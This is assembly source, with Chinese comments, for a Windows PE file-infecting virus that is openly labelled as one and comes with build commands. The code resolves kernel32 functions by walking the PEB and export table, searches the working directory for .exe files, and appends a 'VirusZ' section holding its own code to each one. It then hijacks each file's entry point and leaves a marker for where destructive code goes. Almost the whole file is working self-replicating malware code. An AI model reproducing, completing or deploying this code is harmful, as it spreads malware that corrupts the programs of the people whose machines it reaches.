.586
.model flat, stdcall
option casemap : none ; 区分大小写
;在win10环境下 用masm32编译器链接器
;ml -c -coff virus.asm
;生成virus.obj文件
;link -subsystem:console virus.obj
;生成virus.exe即为病毒母体程序
include windows.inc
include user32.inc
include kernel32.inc
include gdi32.inc

includelib user32.lib
includelib kernel32.lib
includelib gdi32.lib

.data ; 寄主程序要用到的数据
    MsgTitle db "TIPS", 0h
    Msg db "Virus success", 0h
;******************************************>>
;添加的数据结构
;_ProtoGetProcAddress typedef proto :dword ,:dword
;_ProtoLoadLibrary typedef proto :dword
;_ApiGetProcAddress typedef ptr _ProtoGetProcAddress
;_ApiLoadLibrary typedef ptr _ProtoLoadLibrary

;_ProtoMessageBox typedef proto :dword ,:dword ,:dword,:dword
;_ApiMessageBox typedef ptr _ProtoMessageBox

;******************************************<<
	
.code
;==========================================>>宿主程序
main_start:

    push 0h
    call ExitProcess
;==========================================<<寄主程序结束

VirusZ segment
;==========================================>>病毒代码
virus_start:
    call get_offset	
	
get_offset:
    pop ebp   ;此时ebp中存放  主程序和病毒代码  的起始地址
    sub ebp, offset get_offset ; ebp减去offset get_offset才是病毒代码的起始位置
; 取得偏移值，以后所有数据都要加上这个偏移。
; 这个偏移是怎么取得的呢？call get_offset将get_offset的地址压入堆栈，
;然后用pop ebp把地址值放到ebp中，; 再用原来的get_offset地址减去它，
;就拿到了原地址和当前地址的偏移。


    cmp Ori_Entry[ebp], 0h
    jnz save_entry
    mov Ori_Entry[ebp], 401000h
; 什么情况下Ori_Entry[ebp]中的值会是0h呢？
;只有在运行现在这个程序的时候。在后面的代码中可以看到， 
;在传染时，被感染的EXE中Ori_Entry[ebp]都被填入了原入口地址，
;所以只有这个程序在执行时Ori_Entry[ebp] 中为0h。

;ori_entry指的是函数入口地址
;除了这一个程序的入口地址是401000h，
;其他程序都需要另外获取 原入口地址
;因为 添加代码要先执行，所以要先保存 源程序的入口地址

save_entry:
    push Ori_Entry[ebp];保存 源程序入口地址
    pop Ret_Entry[ebp] ;Ret_Entry指的是 重新设定的程序起始入口
; 因为Ori_Entry[ebp]在后面写入EXE时要改为其他的值，所以，先把本次运行的入口地址保存起来，之后跳转使用。

;*************************************>>
;添加代码处
;重定位 api 地址

	jmp start_
new_end: 
;*************************************<<
	
    lea eax, FindData[ebp];这里 存放exe程序的信息
    push eax
    lea eax, FindFile[ebp];*.exe 文件后缀
    push eax
    call ZFindFirstFile ; 查找第一个文件
; 每一个API的调用都在前面加上了一个Z，声明在后面的调用函数部分。
    cmp eax, INVALID_HANDLE_VALUE;如果没有发现exe文件，则跳到结束查找
    jz end_find ; 查找完毕
    mov FindHandle[ebp], eax;如果找到exe文件，则开始感染这个文件
    call infect_file ; 感染文件
    
find_next:
    lea eax, FindData[ebp]
    push eax
    push FindHandle[ebp]
    call ZFindNextFile ; 查找下一个文件
    cmp eax, FALSE
    jz end_find ; 查找完毕
    call infect_file ; 感染文件
    jmp find_next

infect_file:
;感染文件过程 *********
    push 0h
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push 0h
    push FILE_SHARE_READ + FILE_SHARE_WRITE
    push GENERIC_READ + GENERIC_WRITE
    lea eax, FindData[ebp].cFileName;FindData代表一个WIN32_FIND_DATA结构体里面存储一个文件的所有信息
    push eax
    call ZCreateFile ; 打开文件
    cmp eax, INVALID_HANDLE_VALUE
    jz create_err	;如果没有打开这个文件，则失败返回
    mov OpenHandle[ebp], eax
;如果找到，则保存文件句柄到openhandle
    push FILE_BEGIN
    push 0h
    push 3ch
    push OpenHandle[ebp]
    call ZSetFilePointer ; 指向文件3ch处
; 从文件开始数起的3ch处是MZ Header中记录的PE头的偏移。

    push 0h
    lea eax, ReadCount[ebp]
    push eax
    push 4h
    lea eax, PEAddress[ebp]
    push eax
    push OpenHandle[ebp]
    call ZReadFile ; 读取PE头偏移
;读取3ch中 4字节地址 ，把地址 中的地址存放到PEAddress中
    cmp eax, 0h
    jz read_err
;如果读取成功 则此时PEAddress中存放的就是PE头开始的位置
    push FILE_BEGIN
    push 0h
    push PEAddress[ebp]
    push OpenHandle[ebp]
    call ZSetFilePointer ; 指向PE头开始处

    mov HeadLength[ebp], sizeof PEHead + sizeof SectionTable
; HeadLength[ebp]中是PE头和节表的长度和。
;HeadLength[ebp]中是PE头和节表的长度和.
;PEHead就是IMAGE_NT_HEADERS ，长度是固定的f8h
;section_table就是一个节块的大小，一个节块固定28h
    push 0h
    lea eax, ReadCount[ebp]
    push eax
    push HeadLength[ebp]
    lea eax, PEHead[ebp]
    push eax
    push OpenHandle[ebp]
    call ZReadFile ; 读取PE头和节表
;从PE标记开始读取 headlength个字节的大小，到PEHead中
    cmp eax, 0h
    jz read_err

    cmp DWORD ptr PEHead[ebp].Signature, IMAGE_NT_SIGNATURE ; 是否PE格式
;检查是否有PE标记
;IMAGE_NT_SIGNATURE 是 PE\0\0
    jnz end_modify

    cmp WORD ptr PEHead[ebp + 1ah], 0C05h ; 是否已经感染
; PEHead[ebp + 1ah]处的值代表的是该程序的Linker的版本，在MASM32 V8.0中版本为0C05h，而绝大多数程序， 这个值是不相等的，所以用来判断是否感染。
; PEHead[ebp+1ah]处的值代表的是该程序的linker的版本
;如果是0c05则说明已经被感染
    jz end_modify
;开始感染exe 文件的代码 ******************************4
;此时PEHead中存放PE标识出的指针
;此时已经得到 一个exe文件的IMAGE_NT_HEADERS的指针
;这个结构体包含这个exe文件的大部分信息
;
; 下面是感染EXE的代码
    mov eax, PEHead[ebp].OptionalHeader.AddressOfEntryPoint 
; PEHead[ebp].OptionalHeader.AddressOfEntryPoin是程序入口地址的RVA。
    add eax, PEHead[ebp].OptionalHeader.ImageBase 
;PEHead[ebp].OptoinalHeader.ImageBase是程序再入内存的基地址
;这两个值相加才能得到程序入口的真实地址。
;在添加我们的破坏代码前，
;要先保存程序起始
    mov Ori_Entry[ebp], eax ; 保存原程序入口点

    mov eax, sizeof PEHead
    mov SectionAddress[ebp], eax ; 节表开始地址？？？？pE头的大小
    mov VirusLength[ebp], offset virus_end - offset virus_start ; 病毒长度
	;病毒长度
    movzx eax, PEHead[ebp].FileHeader.NumberOfSections ; 节的个数
    inc eax
    mov ecx, 28h 
; 节表中每个节定义占28h。
	;新增一个节virus ， 一个节大小为28h
    mul ecx ; eax = eax * ecx
    ;得数为 section table 的总大小
	;存放到eax中
    add eax, SectionAddress[ebp];加上PE头的大小
    add eax, PEAddress[ebp]		 ;加上PE头起始地址
    cmp eax, PEHead[ebp].OptionalHeader.SizeOfHeaders ; 看是否还能插入一个节
    ja end_modify

    lea edi, SectionTable[ebp]
    movzx eax, PEHead[ebp].FileHeader.NumberOfSections
    mov ecx, 28h
    mul ecx 
; eax中得到节表修改前大小。
    add edi, eax 
; edi存放添加节的开始地址。
    inc PEHead[ebp].FileHeader.NumberOfSections ; 添加一个节

    mov eax, [edi - 28h + 8h] ; 前一节长
    add eax, [edi - 28h + 0ch] ; 前一节RVA
    mov ecx, PEHead[ebp].OptionalHeader.SectionAlignment ; 节的对齐值
    div ecx
    inc eax
    mul ecx
    mov NewSection[ebp].VirtualAddress, eax ; 对齐的新节虚拟地址

    mov eax, VirusLength[ebp] ; 病毒长度
    mov ecx, PEHead[ebp].OptionalHeader.FileAlignment ; 文件的对齐值
    div ecx
    inc eax
    mul ecx
    mov NewSection[ebp].RawSize, eax ; 对齐的新节物理大小

    mov eax, VirusLength[ebp] ; 病毒长度
    mov NewSection[ebp].VirtualSize, eax ; 新节虚拟长度 = 病毒长度

    mov eax, [edi - 28h + 14h] ; 前一节物理偏移
    add eax, [edi - 28h + 10h] ; 前一节物理长度
    mov ecx, PEHead[ebp].OptionalHeader.FileAlignment ; 文件的对齐值
    div ecx
    inc eax
    mul ecx
    mov NewSection[ebp].RawOffset, eax ; 对齐的新节物理偏移

    mov eax, NewSection[ebp].VirtualSize ; 新节虚拟长度
    add eax, PEHead[ebp].OptionalHeader.SizeOfImage ; 加上原文件虚拟长度
    mov ecx, PEHead[ebp].OptionalHeader.SectionAlignment ; 节的对齐值
    div ecx
    inc eax
    mul ecx
    mov PEHead[ebp].OptionalHeader.SizeOfImage, eax ; 新的文件虚拟长度
; 之前的修改都是在改NewSection[ebp]中的，别忘了拷回节表中。

    lea esi, NewSection[ebp]
    mov ecx, 28h
    rep movsb ; 从NewSection中拷到节表中

    mov eax, NewSection[ebp].VirtualAddress
    mov PEHead[ebp].OptionalHeader.AddressOfEntryPoint, eax ; 更新程序入口点

    mov WORD ptr PEHead[ebp + 1ah], 0C05h ; 加上已感染标志

    push FILE_BEGIN
    push 0h
    push PEAddress[ebp]
    push OpenHandle[ebp]
    call ZSetFilePointer ; 文件指针指向PE头处

    push 0h
    lea eax, ReadCount[ebp]
    push eax
    push HeadLength[ebp]
    lea eax, PEHead[ebp]
    push eax
    push OpenHandle[ebp]
    call ZWriteFile ; 写入新的PE头
    cmp eax, 0h
    jz write_err

    push FILE_BEGIN
    push 0h
    push NewSection[ebp].RawOffset
    push OpenHandle[ebp]
    call ZSetFilePointer ; 指向病毒代码写入处（应该在文件尾）

    push 0h
    lea eax, ReadCount[ebp]
    push eax
    push NewSection[ebp].RawSize
    lea eax, virus_start[ebp]
    push eax
    push OpenHandle[ebp]
    call ZWriteFile ; 写入病毒代码
    cmp eax, 0h
    jz write_err

end_modify:
read_err:
write_err:
setpointer_err:
    push OpenHandle[ebp]
    call ZCloseHandle ; 关闭文件
    
create_err:

    ret 
; 感染完毕，ret后继续查找下一个文件。

end_find:
    push FindHandle[ebp]
    call ZFindClose ; 停止查找

; 此处放置破坏代码（包括破坏条件和破坏内容）
;####################################################################
	push MB_OK
	lea eax, MsgTitl[ebp]
    push eax
	lea eax, Ms[ebp]
    push eax
    push NULL
    call zMessageBox
;###################################################################
; 此处放置破坏代码（包括破坏条件和破坏内容）
    push Ret_Entry[ebp] ; 此处为返回寄主程序的入口地址
    ret
; ret从堆栈中取一个值作为跳回的地址，所以，先压入原入口点，再ret就回到了寄主程序入口。

;==========================================<<病毒代码结束

;==========================================>>函数声明
;这里的地址都是NT中的对应API地址，如果要改为9X下执行，就把地址值改为9X的。（地址可以用W32DASM得到。）
	zMessageBox:
;******************************
	;mov FunctionAddress[ebp], 748ff8b0h
	lea edx,_patchFun
	add edx,ebp
	lea eax, szUser32Dll[ebp]
    push eax
	lea ecx, szMessageBox[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]
;************************************************
    ZCreateFile:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szCreateFile[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]

    ZSetFilePointer:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szSetFilePointer[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]

    ZReadFile:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szReadFile[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]


    ZWriteFile:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szWriteFile[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]

    ZCloseHandle:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szCloseHandle[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]

    ZFindFirstFile:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szFindFirstFile[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]

    ZFindNextFile:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szFindNextFile[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]
	
    ZFindClose:
	lea edx,_patchFun
	add edx,ebp
	lea eax, szKernel32DLL[ebp]
    push eax
	lea ecx, szFindClose[ebp]
    push ecx
	call edx
    jmp FunctionAddress[ebp]
    
;==========================================<<函数声明结束



;*******************************************>>
;新添加代码处
;;获取kernel32.dll的基地址
_getKernelBase proc
	local @dwRet
	pushad
	assume fs:nothing
	mov eax,fs:[30h]
	mov eax,[eax+0ch]
	mov esi,[eax+1ch]
	lodsd
	mov eax,[eax+8]
	mov @dwRet,eax
	popad
	mov eax,@dwRet
	ret 
_getKernelBase endp



;获取字符创APi函数的调用地址
;入口参数:_hModule 为动态链接库的基地址
;		  _ipApi为api函数名的首地址
;出口参数：eax为函数在虚拟地址空间中的真实地址
_getApi proc _hModule,_lpApi

	local @ret
	local @dwLen
	
	pushad
	mov @ret,0
	mov edi,_lpApi
	mov ecx,-1
	xor al,al
	cld
	repnz scasb
	mov ecx,edi
	sub ecx,_lpApi
	mov @dwLen,ecx
;从pe文件头导出目录获取到处表地址
	mov esi,_hModule
	add esi,[esi+3ch]
	assume esi:ptr IMAGE_NT_HEADERS
	mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
	add esi,_hModule
	assume esi:ptr IMAGE_EXPORT_DIRECTORY
	
	mov ebx,[esi].AddressOfNames
	add ebx,_hModule
	xor edx,edx
	
	.repeat
		push esi
		mov edi,[ebx]
		add edi,_hModule
		mov esi,_lpApi
		mov ecx,@dwLen
		repz cmpsb
		.if ZERO?
			pop esi
			jmp @F
		.endif
		pop esi
		add ebx,4
		inc edx
	.until edx>=[esi].NumberOfNames
	jmp _ret
@@:
	;通过API名称索引获取徐浩索引，在获取地址索引
	sub ebx,[esi].AddressOfNames
	sub ebx,_hModule
	shr ebx,1
	add ebx,[esi].AddressOfNameOrdinals
	add ebx,_hModule
	movzx eax,word ptr [ebx]
	shl eax,2
	add eax,[esi].AddressOfFunctions
	add eax,_hModule
	
	mov eax,[eax]
	add eax,_hModule
	mov @ret,eax
	
_ret:
	assume esi:nothing 
	popad
	mov eax,@ret
	ret
_getApi endp




;传入两个参数
; function_name_Text  传递 函数 字符串的地址
;function_dll_name_text 传递 动态链接库 名字
_patchFun proc function_name_text,dll_name_text

	
	pushad
	
	mov eax,dll_name_text
	mov edx,function_LoadLibrary[ebx]
	push eax
	call edx
	mov dlladdress[ebx],eax
;使用getprocaddress的首地址
;传入两个参数嗲用getprocaddress函数
;获得messageboxa的首地址
	mov eax,function_name_text
	mov edx,function_GetProcAddress[ebx]
	mov ecx,dlladdress[ebx]
	push eax
	push ecx
	call edx
	mov FunctionAddress[ebx],eax
	popad
	ret
_patchFun endp


_start proc 
	local hKernel32Base:dword
	pushad
	
	;获取Kernle32.dll的地址
	lea edx,_getKernelBase
	add edx,ebx
	call edx
	mov hKernel32Base,eax
	;从基地址出发搜索getprocaddress函数的首地址
	lea eax,szGetProcAddr[ebx]

	
	mov edi,hKernel32Base
	mov ecx,edi
	lea edx,_getApi
	add edx,ebx
	
	push eax
	push ecx
	call edx
	mov function_GetProcAddress[ebx],eax  ; important
	;从基地址出发搜索loadLibraryA函数首地址
	lea eax,szLoadLib[ebx]

	mov edi,hKernel32Base
	mov ecx,edi
	lea edx,_getApi
	add edx,ebx

	push eax
	push ecx
	call edx
	mov function_LoadLibrary[ebx],eax ; important
	ret
	popad 
	
_start endp
;*******************************************<<
	

;==========================================>>病毒数据
; 这些都是病毒程序中用到的数据
    Ret_Entry dd 0h
    Ori_Entry dd 0h
    FindFile db "*.exe", 0h
    FindData WIN32_FIND_DATA <0>
    FindHandle dd 0h
    OpenHandle dd 0h
    ReadCount dd 0h
    PEAddress dd 0h
    PEHead IMAGE_NT_HEADERS <0>
    SectionTable db 280h dup (0)
    HeadLength dd 0h
    SectionAddress dd 0h
    VirusLength dd 0h
    FunctionAddress dd 0h
    MsgTitl db "Caution!", 0h
    Ms db "VirusZ OK!", 0h
;****************************************>>
;添加 数据 节块

	dlladdress dd 0h
    ;function_GetProcAddress _ApiGetProcAddress 0
	;function_LoadLibrary _ApiLoadLibrary 0
    function_GetProcAddress dd 0
	function_LoadLibrary dd 0	
	szGetProcAddr db 'GetProcAddress',0
	szLoadLib 	  db 'LoadLibraryA',0
	
	szMessageBox  		db 'MessageBoxA',0
    szCreateFile		db 'CreateFileA',0
    szSetFilePointer	db 'SetFilePointer',0
    szReadFile			db 'ReadFile',0
    szWriteFile			db 'WriteFile',0
    szCloseHandle		db 'CloseHandle',0
    szFindFirstFile		db 'FindFirstFileA',0
    szFindNextFile		db 'FindNextFileA',0
    szFindClose			db 'FindClose',0
	szUser32Dll	  db 'user32.dll',0
	szKernel32DLL db 'kernel32.dll',0
;****************************************<<
	
    VirusZSection struc
        SectionName db "VirusZ", 0h, 0h
        VirtualSize dd 0h
        VirtualAddress dd 0h
        RawSize dd 0h
        RawOffset dd 0h
        dd 0h, 0h, 0h
        SectionFlags dd 0e0000020h
    VirusZSection ends

    NewSection VirusZSection <>   
;==========================================<<病毒数据结束
start_:
	mov ebx,ebp
	invoke _start
	jmp new_end
    VirusName db 0h, "by tsy", 0h ; 版本信息
virus_end:
VirusZ ends
    end virus_start ; 从病毒代码入口开始执行